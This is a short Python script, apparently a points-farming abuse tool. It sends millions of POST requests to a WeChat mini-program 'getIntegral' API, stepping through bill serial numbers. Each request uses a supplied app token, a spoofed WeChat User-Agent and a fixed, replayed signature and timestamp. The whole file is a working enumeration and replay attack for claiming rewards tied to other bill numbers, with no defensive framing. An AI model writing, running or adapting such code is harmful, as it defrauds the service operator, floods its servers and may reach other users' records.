


def renwu(token):
    import requests
    import json

    url = "https://api.xfjzapp.top//appv20/Bill/getIntegral"
    for i in range(230122,9999999):
        payload = json.dumps({
            "bill_sn": 24073006 + int(i),
            "random_str": "4BGRZFSPr1",
            "req_time": 1722327429,
            "sign": "177170045478085902f0eb96a846875d"
        })

        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11065",
            'Content-Type': "application/json",
            'xweb_xhr': "1",
            'platform': "wxMiniProgram",
            'app-token': token,
        }

        response = requests.post(url, data=payload, headers=headers)

        print(response.text)


if __name__ == "__main__":
    token=""
    renwu(token)